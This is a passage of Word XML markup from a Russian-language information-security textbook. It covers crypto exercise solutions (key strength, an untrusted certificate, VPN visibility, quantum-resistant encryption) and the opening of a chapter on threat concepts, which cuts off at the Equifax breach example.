        <w:t>&lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Алгоритм | Размер ключа | Эквивалентная стойкость (бит) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|--------------|------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| AES-128  | 128          | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>128</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| RSA-2048 | 2048         | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~112</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| ECC-256  | 256          | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~128</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: RSA-2048 — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>самый длинный</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (2048 бит), но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>самый слабый</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (~112 бит стойкости). ECC-256 в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>8 раз короче</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>эквивалентен</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> AES-128.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 4</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты зашёл на `https://bank.com` и увидел сертификат:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Issuer: CN=TotallyLegitCA</w:t>
        <w:br/>
        <w:t>Valid until: 2099-12-31</w:t>
        <w:br/>
        <w:t>Subject: CN=bank.com</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Браузер показал предупреждение "Ваше соединение не защищено". Что не так?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Проблема: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TotallyLegitCA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> не входит в список доверенных центров сертификации (CA), встроенных в браузер.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Возможные причины</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Фишинг** — хакер создал поддельный сертификат</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Self-signed сертификат** — администратор сгенерировал сертификат сам (нормально для внутренних сетей, но не для публичных сайтов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**MITM атака** — кто-то перехватывает трафик и подменяет сертификат</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>НЕ вводи пароль</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на этом сайте. Либо это фейк, либо админ накосячил.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 5</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты установил VPN (WireGuard) на свой ноутбук. Проверь, работает ли он:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Без VPN</w:t>
        <w:br/>
        <w:t>curl https://api.ipify.org</w:t>
        <w:br/>
        <w:t># Вывод: 203.0.113.42 (твой реальный IP)</w:t>
        <w:br/>
        <w:br/>
        <w:t># С VPN</w:t>
        <w:br/>
        <w:t>curl https://api.ipify.org</w:t>
        <w:br/>
        <w:t># Вывод: 198.51.100.5 (IP VPN-сервера)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос</w:t>
      </w:r>
      <w:r>
        <w:t>: Что увидит администратор твоего Wi-Fi, если перехватит трафик?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Без VPN</w:t>
      </w:r>
      <w:r>
        <w:t>: Администратор видит:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все сайты, которые ты посещал (DNS-запросы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Содержимое HTTP-запросов (пароли, логины, сообщения)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Содержимое HTTPS-запросов (нет, но видит **домен** и IP-адреса)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>С VPN</w:t>
      </w:r>
      <w:r>
        <w:t>: Администратор видит:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ты подключился к VPN-серверу (IP + порт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Зашифрованный трафик (WireGuard использует ChaCha20-Poly1305)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ничего больше** (ни домены, ни IP, ни содержимое)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: VPN защищает от подслушивания в общественных Wi-Fi.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Задача со звёздочкой (для параноиков)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ты — параноик. Хочешь зашифровать файл так, чтобы даже </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>если квантовый компьютер появится через 20 лет</w:t>
      </w:r>
      <w:r>
        <w:t>, файл остался в безопасности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Что делать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Используй симметричное шифрование** (AES-256 — квантовые компьютеры **не ускоряют** перебор симметричных ключей, только в 2 раза → AES-256 = 128 бит стойкости против квантовых компьютеров, **достаточно**)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**НЕ используй RSA/ECC** для обмена ключами (квантовый компьютер взломает их за минуты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Передавай ключ AES вручную** (лично, на бумажке, USB-флешке, через курьера)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Используй Argon2 или bcrypt** для генерации ключа из пароля (если передать ключ невозможно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Надейся, что AES-256 выдержит** (пока нет квантовых алгоритмов для взлома AES быстрее чем за 2^128 операций)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Бонус**: Используй **One-Time Pad** (XOR с случайным ключом той же длины, что и файл). **Единственный математически доказуемо стойкий шифр**. Проблема: ключ должен быть **такой же длины**, как и файл, и **использован только один раз**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>&lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Итого</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что запомнить</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🔐 **AES-256-GCM** — для шифрования данных (симметричное, быстро)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🔑 **RSA-2048+** или **ECC-256** — для обмена ключами (асимметричное, медленно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🔒 **SHA-256** — для проверки целостности (хэш-функция)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🔑 **bcrypt** или **Argon2** — для хранения паролей (медленные хэш-функции)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **TLS 1.3** — для защиты данных в интернете (HTTPS, SSH)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🛡️ **Цифровые подписи** — для проверки авторства и целостности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🌐 **VPN (WireGuard)** — для защиты трафика в общественных Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🚀 **Post-Quantum Cryptography** — готовимся к квантовым компьютерам (CRYSTALS-Kyber, CRYSTALS-Dilithium)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Главное правило</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Не пиши свою криптографию</w:t>
      </w:r>
      <w:r>
        <w:t>. Используй проверенные библиотеки (OpenSSL, libsodium, Bouncy Castle). 99% взломов происходит из-за неправильной реализации, а не из-за слабого алгоритма.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>P.S.</w:t>
      </w:r>
      <w:r>
        <w:t>: Если ты дочитал до сюда — ты красавчик. Теперь ты знаешь, как работает криптография в реальном мире. Не взламывай банки, лучше защищай их 😎</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 9.3. Понятия информационной безопасности. Угрозы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Почему твои данные интересуют хакеров больше, чем тебя самого?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, дружище, вот мы уже разобрали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>политику безопасности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глава 9.01) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>криптографию</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глава 9.02). Научились делать правила, шифровать данные, ставить пароли. Но есть нюанс: всё это нужно, потому что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>существуют угрозы</w:t>
      </w:r>
      <w:r>
        <w:t>. Куча людей (и не только людей — ещё боты, вирусы, стихийные бедствия) хотят сломать твою систему, украсть данные или просто устроить хаос.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальность</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 2023 году **IBM** опубликовала отчёт: средняя стоимость утечки данных — **$4.45 миллиона**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждые **39 секунд** происходит кибератака где-то в мире.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**60%** малого бизнеса закрываются в течение **6 месяцев** после успешной кибератаки.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Твои данные (email, пароли, банковские карты) стоят на чёрном рынке от **$1** до **$1000** в зависимости от качества.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему это происходит?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Потому что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>информация = деньги</w:t>
      </w:r>
      <w:r>
        <w:t>. Хакеры не ломают системы ради спортивного интереса (ну, иногда ради интереса, но чаще — ради денег). Украли базу с номерами кредитных карт → продали на даркнет-форуме → профит. Зашифровали серверы компании → требуют выкуп в биткоинах → профит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В этой главе мы разберём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Основные понятия ИБ (актив, уязвимость, угроза, риск)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Классификация угроз (внутренние vs внешние, природные, техногенные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Типы воздействия (конфиденциальность, целостность, доступность → связь с CIA Triad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель угроз (как понять, от чего защищаться)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TOP-10 OWASP (самые частые уязвимости веб-приложений)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Реальные примеры взломов (Equifax, WannaCry, Colonial Pipeline, LastPass)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оценка рисков (формула, матрица)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.01 (Политика безопасности)** — политика защищает от угроз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.02 (Криптография)** — шифрование защищает от угроз конфиденциальности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.04 (Противодействие нарушению конфиденциальности)** — методы защиты от конкретных угроз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.05 (Способы нарушения конфиденциальности. Атаки)** — конкретные атаки, которые реализуют угрозы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.06 (Методы реализации угроз)** — технические детали атак</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.04 (Протоколы Internet)** — сетевые угрозы (DDoS, MITM, сниффинг)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3.1. Основные понятия информационной безопасности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Прежде чем говорить об угрозах, разберёмся с базовыми терминами. Это как в покере: прежде чем играть, нужно знать, что такое флоп, ривер и блайнды.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Информационная безопасность (ИБ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> от несанкционированного </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>доступа, изменения, уничтожения или утечки</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проще говоря</w:t>
      </w:r>
      <w:r>
        <w:t>: Цель ИБ — чтобы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Конфиденциальность** — секретные данные видели только те, кому положено</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Целостность** — данные не изменялись злоумышленниками</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Доступность** — легитимные пользователи могли получить доступ, когда нужно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CIA Triad</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Confidentiality, Integrity, Availability), которую мы разбирали в главе 9.01. Все угрозы в ИБ нарушают хотя бы один из этих принципов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Актив (Asset)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Всё, что имеет ценность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для организации и нуждается в защите.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры активов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Данные**: база клиентов, финансовые отчёты, медицинские записи, исходный код</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оборудование**: серверы, ноутбуки, смартфоны, сетевое оборудование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Программное обеспечение**: ОС, СУБД, приложения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Персонал**: сотрудники с критичными знаниями (например, системный администратор — единственный, кто знает пароль от root)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Репутация**: если утекут данные клиентов, репутация компании пострадает → потеря клиентов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Для банка </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>главный актив</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — база данных с балансами счетов. Если хакеры получат доступ и изменят баланс (например, добавят себе миллион долларов), банк обанкротится.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уязвимость (Vulnerability)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Слабое место</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в системе, которое можно использовать для атаки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры уязвимостей</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Программные**: SQL-инъекция, переполнение буфера (buffer overflow), XSS (Cross-Site Scripting)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Конфигурационные**: открытый порт 22 (SSH) на весь интернет, дефолтный пароль admin/admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Человеческие**: сотрудник кликает на фишинговые письма, использует пароль `123456`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Физические**: сервер стоит в незапертой комнате</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2017 году </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Equifax</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (кредитное бюро) использовало устаревшую версию </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Apache Struts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (веб-фреймворк) с известной уязвимостью </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CVE-2017-5638</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Патч вышел в марте, но администраторы </w:t>
      </w:r>
